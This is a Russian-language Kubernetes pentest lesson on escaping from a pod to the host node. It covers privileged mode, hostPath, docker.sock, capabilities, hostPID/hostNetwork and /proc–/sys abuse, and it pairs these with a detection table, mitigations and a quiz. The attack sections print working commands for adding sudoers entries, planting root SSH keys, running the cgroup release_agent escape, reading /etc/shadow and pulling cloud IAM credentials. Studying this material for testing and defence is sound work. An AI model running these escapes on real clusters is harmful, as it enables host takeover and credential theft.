---
id: cloud-kubernetes-escape
title: "Побег из пода: hostPath, privileged, nsenter и capability-трюки"
category: cloud
parent: cloud-containers-docker
difficulty: hard
order: 2
tags: [cloud, kubernetes, escape, hostpath, privileged, nsenter, container]
prerequisites: [cloud-containers-docker, cloud-kubernetes-rbac]
useful_for:
  - "Побег из контейнера/пода на хост"
  - "Пентест Kubernetes-кластеров"
  - "Понимание, когда контейнер = хост"
estimated_minutes: 40
summary: "Полный разбор побега из пода на хост: hostPath, privileged, hostPID/hostNetwork, capabilities, монтирование docker.sock и ядерные трюки. Что проверить в первую очередь."
---
## Зачем этот урок

Контейнер — не песочница. Он изолирует процессы через namespaces и cgroups, но при неверной конфигурации эта изоляция ломается. Если под запущен с `privileged`, смонтирован `hostPath`, доступен `docker.sock`, выданы лишние capabilities или включены `hostPID`/`hostNetwork` — побег к ноде становится тривиальным. В этом уроке разберём пять векторов побега, как их обнаружить, как эксплуатировать и как защититься.

## Шаг 0: понять, где вы

```bash
id
cat /proc/1/cgroup
ls -la /var/run/docker.sock
capsh --print
mount | grep -E 'overlay|host|kube'
env | grep -i kube
cat /proc/self/status | grep -E 'CapEff|CapBnd'
```

Если в cgroup есть `docker` или `kubepods` — вы в контейнере. Наличие `/var/run/docker.sock` — прямой признак потенциального побега. Вывод `capsh --print` покажет capabilities: `cap_sys_admin` — очень опасно.

## Вектор 1: privileged контейнер

`--privileged` снимает почти все ограничения: даёт все capabilities и доступ к устройствам хоста.

```bash
fdisk -l
# Disk /dev/sda: 40 GiB ...
mkdir /mnt/host && mount /dev/sda1 /mnt/host
chroot /mnt/host /bin/bash
# или сразу в хостовые namespaces
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

Второй путь — через cgroup `release_agent` (работает даже без монтирования диска). В Kubernetes `securityContext.privileged: true` включается только при ослабленном Pod Security Admission.

## Вектор 2: hostPath

Монтирование хостовой директории. Если смонтирован `/` или `/etc`:

```bash
cat /proc/self/mountinfo | grep -i host
# 1234 / /host rw,relatime - ext4 /dev/sda1 ...
echo 'pwn ALL=(ALL) NOPASSWD:ALL' >> /host/etc/sudoers
mkdir -p /host/root/.ssh && echo "$KEY" >> /host/root/.ssh/authorized_keys
```

Опасные hostPath: `/`, `/etc`, `/var/run/docker.sock`, `/etc/kubernetes`, `/var/lib/kubelet`. Через `/var/lib/kubelet` можно получить kubelet-креды.

## Вектор 3: docker.sock

```bash
docker -H unix:///var/run/docker.sock ps
docker -H unix:///var/run/docker.sock run -v /:/host --privileged -it alpine chroot /host bash
```

Или через API напрямую:
```bash
curl --unix-socket /var/run/docker.sock http://localhost/containers/json
```

Docker-демон запускает контейнеры от root — вы получаете root хоста.

## Вектор 4: capabilities

- `CAP_SYS_ADMIN` — mount, cgroup-побег, `nsenter`.
- `CAP_SYS_PTRACE` — ptrace хостовых процессов, чтение памяти.
- `CAP_NET_ADMIN` — манипуляции сетью.
- `CAP_DAC_READ_SEARCH` — чтение любых файлов.

```bash
# CAP_SYS_ADMIN + cgroup v1 release_agent escape
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
printf '#!/bin/sh\nps > %s/out' "$host_path" > /cmd && chmod +x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

## Вектор 5: hostPID / hostNetwork

`hostPID: true` показывает хостовые процессы; `nsenter -t 1 -m -u -i -n -p -- bash` даёт хостовый shell. `hostNetwork: true` открывает доступ к `169.254.169.254` (облачные креды) и к localhost-сервисам ноды (kubelet, etcd, метрики).

```bash
nsenter -t 1 -m -u -i -n -p -- bash
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

## Разобранный пример: hostPath + privileged за 3 шага

```bash
# 1. находим смонтированный хост-корень
cat /proc/self/mountinfo | grep ' /host '
# 2. добавляем свой SSH-ключ
mkdir -p /host/root/.ssh
echo "$(cat /tmp/key.pub)" >> /host/root/.ssh/authorized_keys
# 3. заходим
ssh -i /tmp/key root@<node-ip>
# uid=0(root) gid=0(root)
```

## Защита (для защитников)

- Pod Security Admission: уровни `baseline`/`restricted`, не разрешать privileged.
- Не монтировать `hostPath` (особенно `/`, `/etc`, docker.sock).
- Убрать лишние capabilities (`drop: ["ALL"]`, `add` только нужное).
- `hostPID`/`hostNetwork` — запрещены по умолчанию.
- Runtime-защита: Falco, seccomp, AppArmor.
- RBAC: не давать `create pods` с `privileged` где не нужно.

## Частые ошибки

- Считать контейнер изолированным по умолчанию.
- Забывать про hostPath, смонтированный «для удобства».
- Игнорировать capabilities, кроме privileged.
- Не проверять `hostPID`/`hostNetwork` перед эксплуатацией.
- Забывать, что побег к ноде часто ведёт к облачным креды через метаданные.
- Ломать ноду (риск убить кластер) — действуйте аккуратно.

## Что дальше / решение

После побега к ноде: читайте kubelet-конфиги, `/etc/kubernetes/pki`, метаданные облака, ищите SA-токены и секреты. Для защиты — включите PSA restricted и runtime-мониторинг.

## Вектор 6: /proc и /sys

Даже без privileged некоторые пути `/proc` и `/sys` доступны на запись. `CAP_SYS_ADMIN` или `hostPath` на `/sys/fs/cgroup` открывают cgroup-побег. Проверьте:

```bash
ls -la /proc/sys/kernel/core_pattern
cat /sys/fs/cgroup/cgroup.controllers
mount | grep cgroup
```

Если `/sys/fs/cgroup` writable и cgroup v1 — работает release_agent. Если `/proc/sys` writable — можно изменить `core_pattern` и выполнить команду при краше.

## Инструменты автоматизации

```bash
# deepce — авторазведка и побег
./deepce.sh
./deepce.sh --no-write -e   # только разведка
# CDK (Container DucK)
./cdk evaluate
./cdk run mount-disk
# kdigger
./kdigger -v
```

`deepce.sh` без флагов перебирает векторы; `--no-write` — безопасный режим; `-e` — exploit. `cdk evaluate` показывает доступные примитивы побега.

## Разобранный пример 2: побег через docker.sock из пода

```bash
ls -la /var/run/docker.sock
# srw-rw---- 1 root docker 0 ... /var/run/docker.sock
docker -H unix:///var/run/docker.sock ps
# CONTAINER ID   IMAGE   COMMAND
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host /bin/sh
# uid=0(root)
cat /host/etc/shadow | head -3
```

## Таблица обнаружения

| Признак | Команда | Значение |
|---------|---------|----------|
| privileged | `cat /proc/self/status \| grep CapEff` | CapEff=0000003fffffffff |
| hostPath | `cat /proc/self/mountinfo` | путь хоста в маунтах |
| docker.sock | `ls -la /var/run/docker.sock` | сокет присутствует |
| hostPID | `ps aux \| wc -l` | видны хостовые процессы |
| hostNetwork | `ip addr` | интерфейсы ноды |

## Порядок действий при побеге

Начинайте с наименее разрушительного: сначала разведка (`id`, `capsh --print`, `mount`), затем проверка, какой из пяти векторов доступен, затем минимальный PoC (например, чтение `/host/etc/hostname` вместо записи в `/etc/sudoers`). Только убедившись, что путь работает, выполняйте действия, меняющие систему. Помните: сломанная нода = потерянный кластер и провал engagement.

## Сравнение векторов побега по «стоимости»

Не все векторы равнозначны. `privileged` и `hostPath` на `/` дают root на ноде почти без усилий, но встречаются реже. `docker.sock` — прямой root, если сокет смонтирован. Capabilities (особенно `CAP_SYS_ADMIN`) требуют чуть больше подготовки, но часто остаются незамеченными. `hostPID`/`hostNetwork` сами по себе не дают root, но открывают `nsenter` к PID 1 и доступ к метаданным облака. Приоритизируйте так: сначала проверьте privileged, затем hostPath, затем docker.sock, затем capabilities, затем hostPID/hostNetwork. Фиксируйте результат каждого шага, чтобы не повторять работу.

## Митигации по слоям

| Слой | Мера |
|------|------|
| Admission | PSA restricted, OPA/Gatekeeper |
| Pod spec | drop ALL caps, runAsNonRoot, readOnlyRootFilesystem |
| Runtime | seccomp, AppArmor, rootless |
| RBAC | запрет create pods с privileged |
| Сеть | network policy, запрет hostNetwork |
| Мониторинг | Falco, аудит API-сервера |

## Порядок и безопасность

Сначала разведка (id, capsh, mount), затем минимальный PoC (чтение, не запись), только потом — действия, меняющие систему. Помните: сломанная нода = потерянный кластер. Не используйте разрушительные эксплойты, пока не убедились, что путь безопасен и обратим.

## Квиз

```quiz
- question: "Какая настройка пода делает побег через chroot на хост тривиальным?"
  options:
    - "resources.limits"
    - "securityContext.privileged: true"
    - "restartPolicy"
    - "imagePullPolicy"
  answer: 1
  explanation: "Privileged даёт почти полный доступ к хосту, включая монтирование дисков."
- question: "Почему смонтированный /var/run/docker.sock опасен?"
  options:
    - "Он только для чтения"
    - "Он даёт полный контроль над Docker на узле, включая запуск привилегированных контейнеров с монтированием /"
    - "Он шифрует данные"
    - "Он не связан с побегом"
  answer: 1
  explanation: "Через docker.sock можно запустить контейнер с -v /:/host --privileged и войти на хост."
- question: "Какая capability позволяет использовать release_agent cgroup для побега?"
  options:
    - "CAP_NET_RAW"
    - "CAP_SYS_ADMIN"
    - "CAP_CHOWN"
    - "CAP_KILL"
  answer: 1
  explanation: "CAP_SYS_ADMIN разрешает монтирование cgroup, что открывает трюк с release_agent."
- question: "Что даёт hostPID: true для побега?"
  options:
    - "Ускоряет под"
    - "Позволяет через nsenter -t 1 войти в namespace процессов хоста"
    - "Отключает сеть"
    - "Монтирует диск"
  answer: 1
  explanation: "hostPID разделяет таблицу процессов с хостом, поэтому PID 1 — это init узла."
- question: "Какой hostPath-путь чаще всего ведёт к немедленному побегу?"
  options:
    - "/tmp"
    - "корень / или /etc или docker.sock"
    - "/proc/self"
    - "/dev/null"
  answer: 1
  explanation: "Монтирование корня хоста, /etc или docker.sock даёт запись в критичные файлы узла."
```

## Где пригодится

- **Пентест Kubernetes** — побег из пода на узел.
- **Red team** — движение от пода к кластеру.
- **CTF** — категории Cloud/Container.
- **IR/Blue team** — оценка риска конфигураций подов.
- **DevSecOps** — внедрение Pod Security Standards.
